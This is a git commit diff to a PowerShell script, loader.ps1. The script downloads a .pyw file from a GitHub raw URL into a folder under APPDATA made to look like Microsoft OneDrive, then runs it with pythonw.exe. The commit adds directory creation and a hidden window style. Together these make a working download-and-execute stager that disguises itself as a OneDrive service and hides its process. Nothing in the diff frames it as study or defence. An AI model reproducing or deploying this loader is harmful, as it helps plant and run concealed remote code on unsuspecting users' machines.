256e86461022bbb24ebc15cface0d094856f88e8
userofnone2 <userofnone2@gmail.com>
2025-04-10 02:23:58 +0200

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -1,5 +1,5 @@
-
-$pyurl = "https://raw.githubusercontent.com/userofnone2/none/refs/heads/main/onedrive_service_final.pyw"
+$pyurl = "https://raw.githubusercontent.com/userofnone2/none/main/onedrive_service_final.pyw"
 $out = "$env:APPDATA\Microsoft\OneDrive\System\onedrive_service.pyw"
+New-Item -ItemType Directory -Path (Split-Path $out) -Force | Out-Null
 Invoke-WebRequest $pyurl -OutFile $out
-Start-Process "pythonw.exe" $out
+Start-Process -WindowStyle Hidden "pythonw.exe" $out
